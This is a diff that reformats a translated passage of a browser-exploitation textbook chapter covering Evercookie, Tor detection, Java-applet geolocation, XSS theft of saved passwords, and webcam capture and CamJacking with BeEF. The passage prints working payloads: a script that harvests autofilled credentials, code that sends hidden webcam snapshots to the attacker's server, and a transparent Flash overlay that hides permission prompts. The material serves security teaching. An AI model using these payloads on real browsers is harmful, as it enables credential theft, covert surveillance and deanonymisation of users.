+截至本文撰写时，仍不存在一种简单方法可以检测浏览器是否处于隐私模式。早期由 Jeremiah Grossman29 和 Collin Jackson30 进行的研究表明，较旧的浏览器版本（如 Firefox 1.5/2.0）可能会泄露它们是否处于隐私模式。研究人员通过 JavaScript `getComputedStyle` 函数（如第 4 章“利用浏览器历史记录”部分所述）来实现这一点。
 
 仅需知道请求服务器的源 IP 地址，就能确定客户端的地理位置，如果不是区域层面，至少可以确定到国家边界内。
 
@@ -5469,21 +5444,16 @@ end figure
 
 为使不可破坏的 Cookie 更可行，Samy Kamkar（第 2 章中讨论的著名 Samy 蠕虫作者）提出了 Evercookie。Evercookie 通过 [`samy.pl/evercookie/`](http://samy.pl/evercookie/) 获取，采用多层次方式存储可提取的会话标识符。它不单纯依赖普通 HTTP Cookie，而是利用多种其他 artifact，包括：
 
-*   本地共享对象或 Flash Cookie
+* 本地共享对象或 Flash Cookie
+* Silverlight 存储
+* IE userData 存储
+* HTML5 存储
 
-*   Silverlight 存储
-
-*   IE userData 存储
-
-*   HTML5 存储
-
-为提高框架返回浏览器会话可识别的可能性，BeEF 会话 JavaScript 库使用 Evercookie JavaScript 库。这一点在 BeEF 的 get_hook_session_id() 函数中可见，该函数查询三种 Evercookie artifact：cookie、userdata、window data：
+为提高框架返回浏览器会话可识别的可能性，BeEF 会话 JavaScript 库使用 Evercookie JavaScript 库。这一点在 BeEF 的 `get_hook_session_id()` 函数中可见，该函数查询三种 Evercookie artifact：cookie、userdata、window data：
 
 ```javascript
 //Create the evercookie object first
 ec: new evercookie(), 
-  
-
 get_hook_session_id: function() {
   // check if the browser is already known to the framework
   var id = this.ec.evercookie_cookie("BEEFHOOK");
@@ -5493,15 +5463,18 @@ get_hook_session_id: function() {
   if (typeof id == 'undefined') {
     var id = this.ec.evercookie_window("BEEFHOOK");
   }
-  
   // if the browser is not known create a hook session id and set it
-  if ((typeof id == 'undefined') || (id == null)) {
-    id = this.gen_hook_session_id();
-    this.set_hook_session_id(id);
-  }
-  
-  // return the hooked browser session identifier
-  return id;
+```
+
+
+
+```javascript
+if ((typeof id == 'undefined') || (id == null)) {
+  id = this.gen_hook_session_id();
+  this.set_hook_session_id(id);
+}
+// return the hooked browser session identifier
+return id;
 }
 ```
 
@@ -5513,7 +5486,7 @@ get_hook_session_id: function() {
 
 Tor 网络的一个有趣特性是任何人都可以提供隐藏服务（仅限于 Tor 网络内可访问）。这称为隐藏服务协议（Hidden Service Protocol），它实现服务器端匿名化，而非仅客户端端匿名化。关于隐藏服务协议的技术细节在此书范围之外，如需更多信息，可访问 [`www.torproject.org/docs/hidden-services.html.en`](https://www.torproject.org/docs/hidden-services.html.en)。
 
-由于这些匿名化服务仅能在 Tor 网络内访问，它们为判断被钩住的浏览器是否使用 Tor 提供了方法。DeepSearch 是一个仅限 Tor 网络的搜索索引，其地址为 [`xycpusearchon2mc.onion`](http://xycpusearchon2mc.onion)。.onion 是伪顶级域名，用于标识 Tor 隐藏服务。虽然它看起来像合法顶级域名，但实际上并非如此，仅在正确配置本地代理并连接到 Tor 网络时才可访问。
+由于这些匿名化服务仅能在 Tor 网络内访问，它们为判断被钩住的浏览器是否使用 Tor 提供了方法。DeepSearch 是一个仅限 Tor 网络的搜索索引，其地址为 [`xycpusearchon2mc.onion`](http://xycpusearchon2mc.onion)。`.onion` 是伪顶级域名，用于标识 Tor 隐藏服务。虽然它看起来像合法顶级域名，但实际上并非如此，仅在正确配置本地代理并连接到 Tor 网络时才可访问。
 
 DeepSearch 包含一个标题徽标，网址为 [`xycpusearchon2mc.onion/deeplogo.jpg`](http://xycpusearchon2mc.onion/deeplogo.jpg)，如果浏览器能够访问该图像，则表明浏览器正在 Tor 网络上。
 
@@ -5521,100 +5494,92 @@ BeEF 的“Detect Tor”模块通过执行以下 JavaScript 代码来检测 Tor 
 
 ```javascript
 var img = new Image();
-  img.setAttribute("style","visibility:hidden");
-  img.setAttribute("width","0");
-  img.setAttribute("height","0");
-  img.src = '<%= @tor_resource %>';
-  img.id = 'torimg';
-  img.setAttribute("attr","start");
-  img.onerror = function() {
-    this.setAttribute("attr","error");
+img.setAttribute("style","visibility:hidden");
+img.setAttribute("width","0");
+img.setAttribute("height","0");
+img.src = '<%= @tor_resource %>';
+img.id = 'torimg';
+img.setAttribute("attr","start");
+img.onerror = function() {
+  this.setAttribute("attr","error");
+};
+img.onload = function() {
+  this.setAttribute("attr","load");
+};
+document.body.appendChild(img);
+setTimeout(function() {
+  var img = document.getElementById('torimg');
+  if (img.getAttribute("attr") == "error") {
+    beef.net.send('<%= @command_url %>',
+      <%= @command_id %>,
+      'result=Browser is not behind Tor');
+  } else if (img.getAttribute("attr") == "load") {
+    beef.net.send('<%= @command_url %>',
+      <%= @command_id %>,
+      'result=Browser is behind Tor');
+  } else if (img.getAttribute("attr") == "start") {
+    beef.net.send('<%= @command_url %>',
+      <%= @command_id %>,
+      'result=Browser timed out. \
+       Cannot determine if browser is behind Tor');
   };
-  img.onload = function() {
-    this.setAttribute("attr","load");
-  };
-
-  document.body.appendChild(img);
-
-  setTimeout(function() {
-    var img = document.getElementById('torimg');  
-    if (img.getAttribute("attr") == "error") {
-      beef.net.send('<%= @command_url %>',
-        <%= @command_id %>,
-        'result=Browser is not behind Tor');
-    } else if (img.getAttribute("attr") == "load") {
-      beef.net.send('<%= @command_url %>',
-        <%= @command_id %>,
-        'result=Browser is behind Tor');
-    } else if (img.getAttribute("attr") == "start") {
-      beef.net.send('<%= @command_url %>',
-        <%= @command_id %>,
-          'result=Browser timed out. \
-           Cannot determine if browser is behind Tor');
-    };
-    document.body.removeChild(img);
-    }, <%= @timeout %>);
+  document.body.removeChild(img);
+}, <%= @timeout %>);
 ```
 
-此代码首先创建一个指向 DeepSearch 徽标的 `<img>` 标签，其 URL 通过 @tor_resource 变量动态设置。随后为图像绑定两个事件处理程序：一个在加载成功时触发，另一个在加载失败时触发。最后将图像添加到文档的 body 中，从而向 DeepSearch 服务器提交请求。
+此代码首先创建一个指向 DeepSearch 徽标的 `<img>` 标签，其 URL 通过`@tor_resource`变量动态设置。随后为图像绑定两个事件处理程序：一个在加载成功时触发，另一个在加载失败时触发。最后将图像添加到文档的 body 中，从而向 DeepSearch 服务器提交请求。
 
-`setTimeout()` 函数用于在预定义的时间后检查图像的状态。默认情况下，@timeout 变量设置为 10,000（即 10 秒）。当计时器结束后，代码会检查图像的状态，以判断其是否已加载。如果图像已加载，则说明浏览器处于 Tor 网络内。
+`setTimeout()`函数用于在预定义的时间后检查图像的状态。默认情况下，`@timeout`变量设置为 10,000（即 10 秒）。当计时器结束后，代码会检查图像的状态，以判断其是否已加载。如果图像已加载，则说明浏览器处于 Tor 网络内。
 
 如果浏览器使用的是像 Tor 这样的匿名化代理，那么尝试获取用户的真实 IP 地址可能会进一步泄露其私人信息。这可以通过多种方式实现。
 
 第一种方法是强制浏览器向您控制的 DNS 服务器进行 DNS 请求。如果浏览器配置为通过 Tor 代理所有流量，但不代理 DNS 请求，这可能会泄露有价值的信息。与之前的示例相同，这可以通过简单地向 DOM 添加一个指向由您控制的 DNS 服务器解析的域名的 `<img>` 对象来实现。
 
-
-
-
 第二种可以帮助你确定 IP 地址的技术是加载 Java Applet 或 Flash 文件。如果 Flash 或 Java 未配置为使用 Tor 代理，这些文件可能被构造为仅尝试查询攻击者控制的 Web 服务器上一个唯一图像或其他文件。如果插件未配置使用浏览器代理设置，这些请求可能会泄露目标的真实 IP。
 
-另一种绕过匿名化的方法是使用 BeEF 的“获取实际位置”模块。该模块由 Keith Lee 开发，功能比单纯检测目标源 IP 更进一步。它会根据邻近的无线接入点使用封装在已签名 Java Applet 中的命令来获取地理位置信息。如果目标使用 Windows，Applet 会执行以下命令来获取所有邻近的无线网络：
+另一种绕过匿名化的方法是使用 BeEF 的“获取实际位置”模块。该模块由 Keith Lee 开发，功能比单纯检测目标源 IP 更进一步。它会根据邻近的无线接入点使用封装在已签名 Java Applet 中的命令来获取地理位置信息。如果目标使用 Windows，Applet 会执行以下命令来获取所有邻近的无线网络：
 
-```
+```bash
 netsh wlan show networks mode=bssid
 ```
 
-如果目标使用 OS X，则命令为：
+如果目标使用 OS X，则命令为：
 
-```
+```bash
 /System/Library/PrivateFrameworks/Apple80211.\
 framework/Versions/Current/Resources/airport scan
 ```
 
-执行这些命令后，Applet 会解析结果，提取 SSID、BSSID 和信号强度，并用于查询 Google Maps API（https://maps.googleapis.com/maps/api/browserlocation/json?browser=firefox&sensor=true）。检测到的邻近无线网络越多，地理定位越准确。Google Maps API 可能还会返回街道地址详情以及 GPS 坐标。
+执行这些命令后，Applet 会解析结果，提取 SSID、BSSID 和信号强度，并用于查询 Google Maps API（`https://maps.googleapis.com/maps/api/browserlocation/json?browser=firefox&sensor=true`）。检测到的邻近无线网络越多，地理定位越准确。Google Maps API 可能还会返回街道地址详情以及 GPS 坐标。
 
-利用此方法，只要目标允许已签名 Java Applet 运行，即使其浏览器在 Tor 或其他代理后面，也能被定位。Kyle Wilhoit 在 2013 年成功使用这种攻击手段确定了针对工业控制系统（ICS）设备的中国攻击者的实际位置。31 在 2013 年 BlackHat USA 讲话中，他公开了用于追踪攻击者的部分技术。这些技术中包括使用 ICS 蜜罐配合 BeEF，在攻击者的被钩挂浏览器上加载“检测 Tor”和“获取实际位置”模块。
+利用此方法，只要目标允许已签名 Java Applet 运行，即使其浏览器在 Tor 或其他代理后面，也能被定位。Kyle Wilhoit 在 2013 年成功使用这种攻击手段确定了针对工业控制系统（ICS）设备的中国攻击者的实际位置。31 在 2013 年 BlackHat USA 讲话中，他公开了用于追踪攻击者的部分技术。这些技术中包括使用 ICS 蜜罐配合 BeEF，在攻击者的被钩挂浏览器上加载“检测 Tor”和“获取实际位置”模块。
 
 ## 攻击密码管理器
 
-密码管理软件帮助用户存储和检索密码。密码管理器（在第 7 章中也有探讨）通常作为浏览器的原生功能被包含，也可以作为独立应用。密码管理器应用与浏览器集成的情况也很常见。遗憾的是，在很多情况下这些工具会暴露你的信息。许多网站在安全演进过程中会逐步启用安全特性。对密码管理器的主要防护措施是对表单元素的控制，特别是在密码提交时。这通常涉及添加 autocomplete="off" 标记，以防止浏览器缓存该表单字段。
+密码管理软件帮助用户存储和检索密码。密码管理器（在第 7 章中也有探讨）通常作为浏览器的原生功能被包含，也可以作为独立应用。密码管理器应用与浏览器集成的情况也很常见。遗憾的是，在很多情况下这些工具会暴露你的信息。许多网站在安全演进过程中会逐步启用安全特性。对密码管理器的主要防护措施是对表单元素的控制，特别是在密码提交时。这通常涉及添加`autocomplete="off"`标记，以防止浏览器缓存该表单字段。
 
-Ben Towes 关于利用 XSS 漏洞滥用密码管理器的研究提出了一个良好的框架，用于攻击可能被缓存的表单字段。通过使用 JavaScript 库，即使表单元素已禁用自动填充（autocomplete="off"），仍然可以在存在 XSS 漏洞的页面上利用已保存的凭据。
+Ben Towes 关于利用 XSS 漏洞滥用密码管理器的研究提出了一个良好的框架，用于攻击可能被缓存的表单字段。通过使用 JavaScript 库，即使表单元素已禁用自动填充（`autocomplete="off"`），仍然可以在存在 XSS 漏洞的页面上利用已保存的凭据。
 
 要利用这种情况，你首先需要在目标页面中找到 XSS 向量。随后，确定用于用户名和密码的字段名称。确定字段名后，只需用 JavaScript 动态创建一个表单，等待片刻让浏览器自动填充，然后将数据发送回攻击者。
 
-为简化执行，Towes 将上述逻辑封装到外部 JavaScript 文件中，以便在 XSS 攻击中直接引用。下面的代码示例使用了一个库，它会检查三种用户名字段变体：user、username、un；以及三种密码字段变体：pass、password、pw：
+为简化执行，Towes 将上述逻辑封装到外部 JavaScript 文件中，以便在 XSS 攻击中直接引用。下面的代码示例使用了一个库，它会检查三种用户名字段变体：`user`、`username`、`un`；以及三种密码字段变体：`pass`、`password`、`pw`：
 
-```
+```javascript
 function getCreds(){
   var users = new Array('user','username','un');
   var pass = new Array('pass','password','pw');
   un = pw = "";
-
   for( var i = 0; i < users.length; i++)
   {
     if (document.getElementById(users[i])) {
       un += document.getElementById(users[i]).value;
     }
   }
-
   for( var i = 0; i < pass.length; i++)
   {
     if (document.getElementById(pass[i])) {
       pw += document.getElementById(pass[i]).value;
     }
-    
   }
   alert(un + "|" + pw);
   document.getElementById('myform').style.visibility='hidden';
@@ -5631,53 +5596,50 @@ document.write("</div>");
 check = window.setInterval("getCreds()",100);
 ```
 
-在本例中，需要在存在 XSS 漏洞的页面中通过 `<script>` 标签引入该 JavaScript 文件。代码会在 `<div>` 中创建一个隐藏的表单，并设置定时器每 100 ms 调用 `getCreds`。完成后，会弹出提示框显示用户名和密码（如图 5‑30 所示）。
+在本例中，需要在存在 XSS 漏洞的页面中通过 `<script>` 标签引入该 JavaScript 文件。代码会在 `<div>` 中创建一个隐藏的表单，并设置定时器每 100 ms 调用`getCreds()`。完成后，会弹出提示框显示用户名和密码（如图 5‑30 所示）。
 
 <|ref|>start|>figure<|/ref|><|det|>[[50, 340, 490, 480]]<|/det|>
 
 <|ref|>end|>figure
 
-弹出提示框显示用户名和密码后，代码会隐藏表单。在真实场景中，你会改为使用 XMLHttpRequest POST 请求将表单数据提交到目标站点。此示例在 Chrome 和 Firefox 中可用，但由于 Internet Explorer 将凭据绑定到页面而非源，效果会不佳。
+弹出提示框显示用户名和密码后，代码会隐藏表单。在真实场景中，你会改为使用`XMLHttpRequest` POST 请求将表单数据提交到目标站点。此示例在 Chrome 和 Firefox 中可用，但由于 Internet Explorer 将凭据绑定到页面而非源，效果会不佳。
 
-Brendan Coles 的“获取存储凭据”模块在 BeEF 中使用类似逻辑，通过在 Firefox 浏览器中隐藏的 `<iframe>` 遍历所有密码表单输入，并将表单内容提交回 BeEF 服务器。
+Brendan Coles 的“获取存储凭据”模块在 BeEF 中使用类似逻辑，通过在 Firefox 浏览器中隐藏的 `<iframe>` 遍历所有密码表单输入，并将表单内容提交回 BeEF 服务器。
 
 ## 控制网络摄像头和麦克风
 
 除了物理位置，浏览器还能披露其他敏感信息。如今许多电脑配备内置麦克风，甚至部分笔记本电脑内置摄像头。随着这类技术成本下降，以及笔记本厂商希望简化在线沟通，这类设备的普及程度可能成为新笔记本的默认配置。
 
-BeEF 提供两个实验性模块，通过 Flash 与目标的摄像头交互。第一个是由 Ben Waugh 创作的“摄像头权限检查”模块（Webcam Permission Check），它会在后台透明地判断浏览器是否允许访问摄像头或麦克风。第二个是“摄像头”模块，它会尝试打开摄像头并拍摄多张照片。这两个模块都附带了一个预包装的 SWF 文件，该文件通过 JavaScript 函数与浏览器的 DOM 交互。为简化 SWF 的加载，BeEF 同时预加载了 `swfobject.js`，它暴露了 `swfobject.embedSWF()` 函数。
+BeEF 提供两个实验性模块，通过 Flash 与目标的摄像头交互。第一个是由 Ben Waugh 创作的“摄像头权限检查”模块（Webcam Permission Check），它会在后台透明地判断浏览器是否允许访问摄像头或麦克风。第二个是“摄像头”模块，它会尝试打开摄像头并拍摄多张照片。这两个模块都附带了一个预包装的 SWF 文件，该文件通过 JavaScript 函数与浏览器的 DOM 交互。为简化 SWF 的加载，BeEF 同时预加载了`swfobject.js`，它暴露了`swfobject.embedSWF()`函数。
 
 在“摄像头权限检查”模块中，需要在加载 SWF 文件之前定义以下全局 JavaScript 函数：
 
-* `noPermissions`
-* `yesPermissions`
-* `naPermissions`
+- `noPermissions`
+- `yesPermissions`
+- `naPermissions`
 
+另一个需要预定义的函数是`swfobject.embedSWF()`函数的回调函数；在此示例中是`swfobjectCallback`，如下所示：
 
-
-
-另一个需要预定义的函数是 swfobject.embedSWF() 函数的回调函数；在此示例中是 swfobjectCallback，如下所示：
-
-``` 
+```javascript
 var swfobjectCallback = function(e) {
   if(e.success){
-      beef.net.send("<%= @command_url %>",
-       <%= @command_id %>,
-       "result=Swfobject successfully added flash object \
-        to the victim page");
+    beef.net.send("<%= @command_url %>",
+      <%= @command_id %>,
+      "result=Swfobject successfully added flash object \
+       to the victim page");
   } else {
-      beef.net.send("<%= @command_url %>",
-       <%= @command_id %>,
-       "result=Swfobject was not able to add the swf file \
-        to the page. This could mean there was no flash \
-        plugin installed.");
+    beef.net.send("<%= @command_url %>",
+      <%= @command_id %>,
+      "result=Swfobject was not able to add the swf file \
+       to the page. This could mean there was no flash \
+       plugin installed.");
   }
 }
 ```
 
-此函数会向 BeEF 服务器报告 SWF 文件是否已加载。在调用 swfobject.embedSWF() 函数之前，swfobject.js 必须正确加载到 DOM 中。jQuery 的 getScript() 函数可以帮助完成此类调用，它会获取远程脚本，并在下载成功后运行另一个函数。这优化了是否调用 swfobject.embedSWF() 函数，如下代码片段所示：
+此函数会向 BeEF 服务器报告 SWF 文件是否已加载。在调用`swfobject.embedSWF()`函数之前，`swfobject.js`必须正确加载到 DOM 中。jQuery 的`getScript()`函数可以帮助完成此类调用，它会获取远程脚本，并在下载成功后运行另一个函数。这优化了是否调用`swfobject.embedSWF()`函数，如下代码片段所示：
 
-``` 
+```javascript
 $j.getScript(beef.net.httpproto+'://'+beef.net.host+
     ':'+beef.net.port+'/swfobject.js',
     function(data,txtStatus,jqxhr) {
@@ -5698,144 +5660,185 @@ $j.getScript(beef.net.httpproto+'://'+beef.net.host+
 );
 ```
 
-SWF 文件随后会嵌入 DOM，并执行 cameraCheck.swf。cameraCheck.swf 会检查是否支持网络摄像头，然后根据摄像头的状态向 DOM 发出回调，执行之前定义的全局函数。如果摄像头在特定网站上已全局启用（见 Figure 5-31），cameraCheck.swf 会执行 yesPermissions JavaScript 函数。
 
-start figure 
+
+SWF 文件随后会嵌入 DOM，并执行 `cameraCheck.swf`。`cameraCheck.swf` 会检查是否支持网络摄像头，然后根据摄像头的状态向 DOM 发出回调，执行之前定义的全局函数。如果摄像头在特定网站上已全局启用（见 Figure 5-31），`cameraCheck.swf` 会执行 `yesPermissions` JavaScript 函数。
 
 **Figure 5-31:** OS X Flash Camera and Microphone Settings
 
 ![c05f031.tif](img/c05f031.png)
 
-end figure 
-
-BeEF 的“Webcam”模块利用与 Flash 功能非常相似的方式运行 takeit.swf 文件。一旦该 Flash 文件在浏览器中运行，它会尝试拍摄若干网络摄像头照片。与之前对摄像头访问的限制类似，运行此模块会提示用户接受启用摄像头的权限，如 Figure 5-32 所示。
-
-start figure 
+BeEF 的“Webcam”模块利用与 Flash 功能非常相似的方式运行 `takeit.swf` 文件。一旦该 Flash 文件在浏览器中运行，它会尝试拍摄若干网络摄像头照片。与之前对摄像头访问的限制类似，运行此模块会提示用户接受启用摄像头的权限，如 Figure 5-32 所示。
 
 **Figure 5-32:** Flash Permission dialog box
 
 ![c05f032.tif](img/c05f032.png)
 
-end figure 
-
 为了降低 SWF 文件引发警报的可能性，你可以对目标进行信息收集，并尝试识别它们通常访问的网站。如果这些网站使用内容分发网络（CDN）且要求麦克风或摄像头权限，目标白名单的 CDN 源的可能性很高。与其从随机来源提供恶意 Flash 文件，不如通过 CDN 或其他类似来源提供。不要忘记，你也可以使用第 2 章“ARP Spoofing”部分的技术在来源中注入内容。
 
 虽然利用 Flash 的功能很棒，但你可能会想：“所有这些酷炫的 HTML5 东西我都在听说，能不能不使用 Flash 就能实现？”简短回答是：“当然可以！”
 
-Web Real-Time Communication（WebRTC）是 W3C 为浏览器间实时通信需求制定的当前提案标准。WebRTC 在 Chrome 从 23 版起支持，Firefox 从 22 版起支持。如果你想尝试在 HTML5 中启用摄像头，请参考 navigator.getUserMedia 函数。截至本文写作时，部分功能仍属实验性，可能会随时间变化。
+Web Real-Time Communication（WebRTC）是 W3C 为浏览器间实时通信需求制定的当前提案标准。WebRTC 在 Chrome 从 23 版起支持，Firefox 从 22 版起支持。如果你想尝试在 HTML5 中启用摄像头，请参考 `navigator.getUserMedia` 函数。截至本文写作时，部分功能仍属实验性，可能会随时间变化。
 
-MediaStream API 是 WebRTC 用于描述和处理浏览器内音频或视频数据流的部分。其核心是 MediaStream 对象本身，它是一个指向存储在 DOM 文件或 blob 对象中的 URL 字符串。将其封装在一起需要一些 DOM 元素，包括 <video> 和 <canvas> 元素。
+`MediaStream` API 是 WebRTC 用于描述和处理浏览器内音频或视频数据流的部分。其核心是 `MediaStream` 对象本身，它是一个指向存储在 DOM 文件或 `blob` 对象中的 URL 字符串。将其封装在一起需要一些 DOM 元素，包括 `<video>` 和 `<canvas>` 元素。
 
-下面的代码演示了如何添加所需元素并将 MediaStream 关联到 <video> 元素。随后，代码会在 <canvas> 元素中捕获快照。最后，代码会使用：
+下面的代码演示了如何添加所需元素并将 `MediaStream` 关联到 `<video>` 元素。随后，代码会在 `<canvas>` 元素中捕获快照。最后，代码会使用：
 
 ```
 // Build the video element
+
 var video_element = document.createElement("video");
+
 video_element.id = "vid_id";
+
 video_element.style = "display:none;";
+
 video_element.autoplay = "true";
 
 // Build the canvas element
+
 var canvas_element = document.createElement("canvas");
+
 canvas_element.id ="can_id";
+
 canvas_element.style = "display:none;";
+
 canvas_element.width = "640";
+
 canvas_element.height = "480";
 
 // Add the elements to the document's body
+
 document.body.appendChild(video_element);
+
 document.body.appendChild(canvas_element);
 
 // Returns a drawing context for the canvas element.
+
 // We want a 2D rendering context,
+
 // as opposed to a WebGL context (3D)
+
 var ctx = canvas_element.getContext('2d');
 
 // Define a null set variable for the stream
+
 var localMediaStream = null;
 
 // This function gets called AFTER we have the media stream setup
+
 var captureimage = function() {
+
   // Checks that there is a non-null stream
+
   if (localMediaStream) {
+
     // Draw an image into the canvas from the video element
+
     // aligned to the top left corner (0,0)
+
     ctx.drawImage(video_element,0,0);
 
     // Send a data: URL back to the attacker with the encoded image
+
     beef.net.send("<%= @command_url %>",
+
       <%= @command_id %>,
+
       'image='+canvas_element.toDataURL('image/png'));
+
   } else {
+
     // Something didn't work
+
     beef.net.send("<%= @command_url %>",
+
       <%= @command_id %>,
+
       'result=something went wrong');
+
   }
+
 }
 
 // Ensure we grab the correct window.URL object
+
 window.URL = window.URL || window.webkitURL;
 
 // Ensure we grab the correct getUserMedia function
+
 navigator.getUserMedia  = navigator.getUserMedia || 
+
                           navigator.webkitGetUserMedia ||
+
                           navigator.mozGetUserMedia ||
+
                           navigator.msGetUserMedia;
 
 // Prompt for permission to grab the camera
+
 // Then call the function(stream) function - if successful
+
 navigator.getUserMedia({video:true},function(stream) {
 
   // set the video element to the URL representation of 
+
   // the media stream
+
   video_element.src = window.URL.createObjectURL(stream);
 
   // Copy the stream (this is checked in the captureimage func)
+
   localMediaStream = stream;
 
   // Execute the captureimage function in 2 seconds
+
   setTimeout(captureimage,2000);
 
 }, function(err) {
+
   // Couldn't get stream
+
   beef.net.send("<%= @command_url %>",
+
     <%= @command_id %>,
+
     'result=getUserMedia call failed');
+
 });
 ```
 
 执行此代码的结果是提交一个 data: URI 格式的图像，返回给你。与本章其他许多攻击类似，此攻击仍依赖于社交工程。具体来说，它涉及诱导用户在尝试访问摄像头时接受浏览器警告，如 Figure 5-33 所示。
 
-start figure 
-
 **Figure 5-33:** Warning in Chrome when accessing webcam
 
 ![c05f033.tif](img/c05f033.png)
 
-end figure 
+Techniques have been discovered that trick users into inadvertently allowing a specified origin to use a webcam or microphone with Flash. Igor Homakov demonstrated a similar technique to the Flash ClickJacking concept from RSnake, discussed in Chapter 4, in order to take shots from the webcam without any apparent user-intervention.35 This attack worked in Chrome up to version 27. The attack loaded a Flash object inside another Flash object, the latter being attached to the DOM with `opacity:0`, as shown in the code below:
 
-
-
-Techniques have been discovered that trick users into inadvertently allowing a specified origin to use a webcam or microphone with Flash. Igor Homakov demonstrated a similar technique to the Flash ClickJacking concept from RSnake, discussed in Chapter 4, in order to take shots from the webcam without any apparent user-intervention.35 This attack worked in Chrome up to version 27. The attack loaded a Flash object inside another Flash object, the latter being attached to the DOM with opacity:0, as shown in the code below:
-
-``` 
+```
 <object style="opacity:0.0;position:absolute;
+
 top:129px;left:100px;"  width="270" height="270">
+
  <param name="movie" value="cam.swf">
+
  <embed src="cam.swf" width="270" height="270"></embed>
-</object>  
+
+</object>
 ```
 
-In this way the outer cam.swf was loaded through the object tag. Although it would display the Flash warning asking the user to Allow or Deny the camera access, it would not be visible thanks to the opacity settings. Figure 5-34 shows how the attack would look, adjusting the opacity for demo purposes (otherwise the Flash dialog wouldn’t be seen).
 
- start figure 
+
+In this way the outer `cam.swf` was loaded through the `object` tag. Although it would display the Flash warning asking the user to Allow or Deny the camera access, it would not be visible thanks to the opacity settings. Figure 5-34 shows how the attack would look, adjusting the opacity for demo purposes (otherwise the Flash dialog wouldn’t be seen).
+
+<!-- start figure -->
 
 **Figure 5-34:** CamJacking
 
 ![c05f034.tif](img/c05f034.png)
 
- end figure 
+<!-- end figure -->
 
 Using this attack with versions of Chrome older than 28 would result in accessing the camera or microphone of a user in a more covert way. The only requirement is tricking the target into clicking somewhere in the page as described with ClickJacking attacks in Chapter 4.
 
@@ -5851,119 +5854,87 @@ The chapter finished up by demonstrating direct privacy-impacting events, such a
 
 # Questions
 
-Level1 **1.** Describe a JavaScript method that could be used to rewrite HTML content within a rendered page. **2.** What JavaScript event would need to be overridden to capture mouse click? **3.** Describe a practical example of how you could abuse UI expectations on Internet Explorer. **4.** How can you circumvent the SmartScreen filter in IE? **5.** Why are software update prompts a good feature to impersonate? **6.** What browsers can you execute TabNabbing attacks against? **7.** Describe the benefits and limitations of running a Java applet. Is it better to run a signed or unsigned one? **8.** What resources can be requested to determine if the browser is using Tor? **9.** What conditions must exist to record audio via a browser? **10.** What is a CamJacking attack? 
+<!-- Level1 -->
 
-/Level1
+1. Describe a JavaScript method that could be used to rewrite HTML content within a rendered page.
+2. What JavaScript event would need to be overridden to capture mouse click?
+3. Describe a practical example of how you could abuse UI expectations on Internet Explorer.
+4. How can you circumvent the SmartScreen filter in IE?
+5. Why are software update prompts a good feature to impersonate?
+6. What browsers can you execute TabNabbing attacks against?
+7. Describe the benefits and limitations of running a Java applet. Is it better to run a signed or unsigned one?
+8. What resources can be requested to determine if the browser is using Tor?
+9. What conditions must exist to record audio via a browser?
+10. What is a CamJacking attack?
+
+<!-- /Level1 -->
 
 For answers to the questions please refer to the book’s website at [`browserhacker.com/answers`](https://browserhacker.com/answers%20) or the Wiley website at: [www.wiley.com/go/browserhackershandbook](http://www.wiley.com/go/browserhackershandbook).
 
 **Notes**
 
-1\. Mozilla. (2011). stringify- JavaScript | MDN. Retrieved November 15, 2013 from [`developer.mozilla.org/en-US/docs/JavaScript/Reference/Global\_Objects/JSON/stringify`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/JSON/stringify)
-
-2\. Mozilla. (2013). HTML script element. Retrieved November 15, 2013 from [`developer.mozilla.org/en/docs/Web/HTML/Element/script`](https://developer.mozilla.org/en/docs/Web/HTML/Element/script)
-
-3\. The jQuery Foundation. (2013). Selectors | jQuery API Documentation. Retrieved November 15, 2013 from [`api.jquery.com/category/selectors/`](http://api.jquery.com/category/selectors/)
-
-4\. Microsoft. (2013). attachEvent method (Internet Explorer). Retrieved November 15, 2013 from [`msdn.microsoft.com/en-us/library/ie/ms536343(v=vs.85).aspx`](http://msdn.microsoft.com/en-us/library/ie/ms536343\(v=vs.85\).aspx)
-
-5\. W3C. (2012). DOM Level 3 Events Specification: Focus Event Types. Retrieved November 15, 2013 from [`www.w3.org/TR/DOM-Level-3-Events/#events-focusevent`](http://www.w3.org/TR/DOM-Level-3-Events/#events-focusevent)
-
-6\. Google. (2013). Keyboard Shortcuts - Gmail Help. Retrieved November 15, 2013 from [`support.google.com/mail/answer/6594?hl=en`](http://support.google.com/mail/answer/6594?hl=en)
-
-7\. W3C. (2013). DOM Level 3 Events Specification: Security Considerations. Retrieved November 15, 2013 from [`www.w3.org/TR/DOM-Level-3-Events/#security-considerations-Security`](http://www.w3.org/TR/DOM-Level-3-Events/#security-considerations-Security)
-
-8\. W3C. (2013). DOM Level 3 Events Specification: Key Values and Unicode. Retrieved November 15, 2013 from [`www.w3.org/TR/DOM-Level-3-Events/#keys-unicode`](http://www.w3.org/TR/DOM-Level-3-Events/#keys-unicode)
-
-9\. W3C. (2013). DOM Level 3 Events Specification: Guidelines for selecting and defining key values. Retrieved November 15, 2013 from [`www.w3.org/TR/DOM-Level-3-Events/#keys-Guide`](http://www.w3.org/TR/DOM-Level-3-Events/#keys-Guide)
-
-10\. Jan Wolter. (2012). JavaScript Madness: Keyboard Events. Retrieved November 15, 2013 from [`unixpapa.com/js/key.html`](http://unixpapa.com/js/key.html)
-
-11\. Wikipedia. (2013). Browser wars. Retrieved November 15, 2013 from [`en.wikipedia.org/wiki/Browser_wars`](http://en.wikipedia.org/wiki/Browser_wars)
-
-12\. Caniuse. (2013). Pointer events. Retrieved November 15, 2013 from [`caniuse.com/pointer-events`](http://caniuse.com/pointer-events)
-
-13\. Debasis Mohanty. (2005). Defeating Citi-Bank Virtual Keyboard Protection. Retrieved November 15, 2013 from [`seclists.org/bugtraq/2005/Aug/88`](http://seclists.org/bugtraq/2005/Aug/88)
-
-14\. W3C. (2013). Touch Events. Retrieved November 15, 2013 from W3C. 2013. “Touch Events Version 1.” Accessed April 1, 2013. [`www.w3.org/TR/touch-events/`](http://www.w3.org/TR/touch-events/)
-
-15\. Aza Raskin. (2010). Tabnabbing: A New Type of Phishing Attack. Retrieved November 15, 2013 from [`www.azarask.in/blog/post/a-new-type-of-phishing-attack/`](http://www.azarask.in/blog/post/a-new-type-of-phishing-attack/)
-
-16\. Sindre Sorhus. (2013). Screenfull.js. Retrieved November 15, 2013 from [`github.com/sindresorhus/screenfull.js`](https://github.com/sindresorhus/screenfull.js)
-
-17\. Rosario Valotta. (2013). Abusing browsers user interfaces (for fun & profit). Retrieved November 15, 2013 from [`sites.google.com/site/tentacoloviola/abusing-browsers-gui`](https://sites.google.com/site/tentacoloviola/abusing-browsers-gui)
-
-
-
-
